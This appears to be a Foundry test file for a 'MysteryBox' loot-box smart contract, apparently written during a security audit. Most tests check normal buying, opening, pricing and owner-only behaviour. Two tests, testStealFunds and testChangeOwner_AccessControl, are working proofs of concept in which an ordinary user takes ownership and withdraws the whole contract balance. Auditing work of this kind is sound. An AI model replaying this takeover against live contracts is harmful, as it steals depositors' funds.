// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "lib/forge-std/src/console2.sol";
import {Test} from "lib/forge-std/src/Test.sol";
//import {ERC20Mock} from "../src/ERC20Mock.sol";
import "../src/MysteryBox.sol";

contract MysteryBoxTest is Test {
    MysteryBox public mysteryBox;
    address public owner = makeAddr("owner");
    address public user1 = makeAddr("us1");
    address public user2 = makeAddr("us2");
    address public user3 = makeAddr("us3");
    address public user4 = makeAddr("us4");
    address[] public players;

    //ERC20Mock public usdc;

    function setUp() public {
        vm.deal(owner, 30 ether);
        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);

        for (uint i = 0; i < 5; i++) {
            address recipient = vm.addr(i + 1);
            players.push(recipient);

            vm.deal(recipient, 0.1 ether);
        }

        vm.startPrank(owner);
        mysteryBox = new MysteryBox{value: 20 ether}();

        console2.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
        console2.log("Bal:", mysteryBox.getBalance());
    }

    function testAnyoneCanClaimReward() public {
        vm.startPrank(user4);
        vm.expectRevert();
        mysteryBox.claimSingleReward(2);
        assertEq(user4.balance, 1 ether);
    }

    function testPlayerCanClaimALLRewards() public {
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint r = mysteryBox.openBox();
        console2.log("REWARD:", r);
        vm.expectRevert();
        mysteryBox.claimAllRewards();
        assertEq(user1.balance, 0.9 ether);
    }

    function testPlayerCanClaimRewards() public {
        //
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint r = mysteryBox.openBox();
        console2.log("REWARD:", r);
        mysteryBox.claimSingleReward(0);
        //
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint a = mysteryBox.openBox();
        console2.log("REWARD:", a);
        mysteryBox.claimSingleReward(1);
        MysteryBox.Reward[] memory aa = mysteryBox.getRewards(user1);
        //
        vm.startPrank(user2);
        mysteryBox.buyBox{value: 0.1 ether}(); //silver reward 1
        uint b = mysteryBox.openBox();
        console2.log("REWARD:", b);
        //
        mysteryBox.buyBox{value: 0.1 ether}(); //silver reward 2
        uint c = mysteryBox.openBox();
        console2.log("REWARD:", c);
        mysteryBox.buyBox{value: 0.1 ether}(); //silver reward 3
        mysteryBox.claimAllRewards();
        MysteryBox.Reward[] memory rew = mysteryBox.getRewards(user2);

        //
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint w = mysteryBox.openBox();
        console2.log("REWARD:", w);
        mysteryBox.claimSingleReward(0);
        //
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint t = mysteryBox.openBox();
        console2.log("REWARD:", t);
        mysteryBox.claimSingleReward(1);
        //
        vm.startPrank(user4);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint y = mysteryBox.openBox();
        console2.log("REWARD:", y);
        mysteryBox.claimSingleReward(0);
        //
        vm.startPrank(user4);
        mysteryBox.buyBox{value: 0.1 ether}();
        uint f = mysteryBox.openBox();
        console2.log("REWARD:", f);
        mysteryBox.claimSingleReward(1);

        //  assertEq(mysteryBox.getBalance(), 19.9 ether);
        assertEq(user3.balance, 0.8 ether);
        assertEq(user2.balance, 1.7 ether);
        assertEq(user1.balance, 0.8 ether);
        assertEq(rew.length, 0);
        assertEq(aa.length, 2);
    }

    function testStealFunds() public {
        vm.startPrank(user2);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();

        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.changeOwner(user1);
        mysteryBox.withdrawFunds();
        vm.stopPrank();

        assertEq(mysteryBox.getBalance(), 0);
    }

    function testBuyOpenBoxAndClaimAllRewards() public {
        for (uint i = 0; i < players.length; i++) {
            address player = players[i];
            vm.startPrank(player);
            mysteryBox.buyBox{value: 0.1 ether}();
            uint r = mysteryBox.openBox();
            console2.log("REWARD:", r);
            MysteryBox.Reward[] memory rewards = mysteryBox.getRewards(player);
            console2.log("Player:", player);
            console2.log("Number of rewards:", rewards.length);

            for (uint j = 0; j < rewards.length; j++) {
                console2.log("Reward Name:", rewards[j].name);
                console2.log("Reward Amount:", rewards[j].value);
            }
            vm.stopPrank();
        }
        assertEq(mysteryBox.getBalance(), 0.6 ether);
    }

    function testOwnerIsSetCorrectly() public view {
        assertEq(mysteryBox.owner(), owner);
    }

    function testFailSetBoxPrice() public {
        uint256 newPrice = 0.2 ether;
        vm.startPrank(user1);
        mysteryBox.setBoxPrice(newPrice);
        assertEq(mysteryBox.boxPrice(), newPrice);
    }

    function testSetBoxPrice_NotOwner() public {
        vm.expectRevert("Only owner can set price");
        vm.startPrank(user1);
        mysteryBox.setBoxPrice(0.2 ether);
    }

    function testAddReward() public {
        mysteryBox.addReward("Diamond Coin", 2 ether);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewardPool();
        assertEq(rewards.length, 5);
        assertEq(rewards[4].name, "Diamond Coin");
        assertEq(rewards[4].value, 2 ether);
    }

    function testAddReward_NotOwner() public {
        vm.startPrank(user1);
        vm.expectRevert("Only owner can add rewards");
        mysteryBox.addReward("Diamond Coin", 2 ether);
    }

    function testBuyBox() public {
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        assertEq(mysteryBox.boxesOwned(user1), 1);
    }

    function testBuyBox_IncorrectETH() public {
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        vm.expectRevert("Incorrect ETH sent");
        mysteryBox.buyBox{value: 0.05 ether}();
    }

    function testOpenBox() public {
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        console2.log("Before Open:", mysteryBox.boxesOwned(user1));
        vm.startPrank(user1);
        mysteryBox.openBox();
        console2.log("After Open:", mysteryBox.boxesOwned(user1));
        assertEq(mysteryBox.boxesOwned(user1), 0);

        vm.startPrank(user1);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards(user1);
        console2.log(rewards[0].name);
        assertEq(rewards.length, 1);
    }

    function testOpenBox_NoBoxes() public {
        vm.startPrank(user1);
        vm.expectRevert("No boxes to open");
        mysteryBox.openBox();
    }

    function testTransferReward_InvalidIndex() public {
        vm.startPrank(user1);
        vm.expectRevert("Invalid index");
        mysteryBox.transferReward(user2, 0);
    }

    function testWithdrawFunds() public {
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();

        uint256 ownerBalanceBefore = owner.balance;
        console2.log("Owner Balance Before:", ownerBalanceBefore);
        vm.startPrank(owner);
        mysteryBox.withdrawFunds();
        uint256 ownerBalanceAfter = owner.balance;
        console2.log("Owner Balance After:", ownerBalanceAfter);

        assertEq(ownerBalanceAfter - ownerBalanceBefore, 0.1 ether);
    }

    function testWithdrawFunds_NotOwner() public {
        vm.startPrank(user1);
        vm.expectRevert("Only owner can withdraw");
        mysteryBox.withdrawFunds();
    }

    function testChangeOwner() public {
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testChangeOwner_AccessControl() public {
        vm.startPrank(user1);
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }
}
